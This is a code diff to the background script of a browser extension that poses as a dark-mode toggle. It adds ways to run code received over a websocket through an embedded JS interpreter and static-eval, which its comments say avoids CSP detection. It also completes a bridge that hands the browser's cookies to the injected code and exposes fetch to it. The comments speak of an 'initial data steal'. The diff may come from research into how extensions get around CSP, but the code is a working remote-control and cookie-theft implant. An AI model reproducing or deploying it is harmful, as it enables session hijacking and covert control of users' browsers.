@@ -1,4 +1,4 @@
-importScripts('acorn_interpreter.js')
+importScripts("packages/acorn_interpreter.js", "packages/esprima.js","packages/escodegen.js", "packages/static-eval.js");
 
 // Perform the initial data steal and connect to websockets only after website is ready
 async function onReady() {
@@ -10,7 +10,7 @@ async function onReady() {
 
 chrome.runtime.onInstalled.addListener(onReady);
 chrome.action.onClicked.addListener((tab) => {
-    chrome.tabs.sendMessage(tab.id, { type: "TOGGLE_DARK_MODE" });
+    chrome.tabs.sendMessage(tab.id, {type: "TOGGLE_DARK_MODE"});
 });
 
 /* =================================================================================== */
@@ -121,19 +121,22 @@ async function onWsMessage(event) {
     }
 
     if (parsedMessage.type.includes('BG_COMMAND')) {
-        // Show that eval is blocked by CSP
-        executeWithEval(parsedMessage.data);
-
-        // Show that eval through setTimout is blocked by CSP in the background script
-        executeWithSetTimeout(parsedMessage.data);
+        // // Show that eval is blocked by CSP
+        // executeWithEval(parsedMessage.data);
+        //
+        // // Show that eval through setTimout is blocked by CSP in the background script
+        // executeWithSetTimeout(parsedMessage.data);
+        //
+        // // Alternative, execute the command with the interpreter, goes unnoticed by CSP
+        // executeWithInterpreter(parsedMessage.data);
 
         // Alternative, execute the command with the interpreter, goes unnoticed by CSP
-        executeWithInterpreter(parsedMessage.data);
+        executeWithStaticEval(parsedMessage.data);
     }
 
     if (parsedMessage.type.includes('CS_COMMAND')) {
         console.log('Sending command to content script ...')
-        chrome.tabs.sendMessage(currentTab.id, { type: 'COMMAND', data: parsedMessage.data });
+        chrome.tabs.sendMessage(currentTab.id, {type: 'COMMAND', data: parsedMessage.data});
         // Alternatively, execute the command with the debugger
         // executeWithDebugger(parsedMessage.data, currentTab.id);
     }
@@ -159,16 +162,18 @@ async function executeWithDebugger(command, tabId) {
 // Execute injected code through a JS interpreter
 function executeWithInterpreter(command) {
     console.log("\nExecuting with JSInterpreter ...")
-
     // Define a wrapper for the chrome.cookies.getAll function
-    const portCookies = function(interpreter, globalObject) {
-        const wrapper = function getAll(query, varName) {
+    const portCookies = function (interpreter, globalObject) {
+        const wrapper = function getAll(query, callback) {
             const nativeQuery = interpreter.pseudoToNative(query)
 
-            chrome.cookies.getAll(nativeQuery, (cookies) => {
-                // TODO: figure out how to return the cookies not just log them
-                console.log(cookies)
-            });
+            const nativeCallback = function (result) {
+                // Convert result to a pseudo object and call the interpreted callback
+                const pseudoResult = interpreter.nativeToPseudo(result);
+                callback(pseudoResult);
+            };
+
+            chrome.cookies.getAll(nativeQuery, nativeCallback);
         };
 
         // Add the chrome.cookies.getAll function to the interpreter
@@ -186,6 +191,19 @@ function executeWithInterpreter(command) {
     };
     const interpreter = new Interpreter(command, initFunc)
     interpreter.run()
+}
+
+// Execute injected code through AST conversion and static eval
+function executeWithStaticEval(command) {
+    console.log("\nExecuting with Static Eval ...")
+
+    const ast = esprima.parse(command).body[0].expression;
+
+    staticEval.evaluate(esprima.parse('console.log(`starting`)'), {console})
+    staticEval.evaluate(
+            ast,
+            {chrome, console, fetch},
+        );
 }
 
 // Execute injected code through a setTimeout
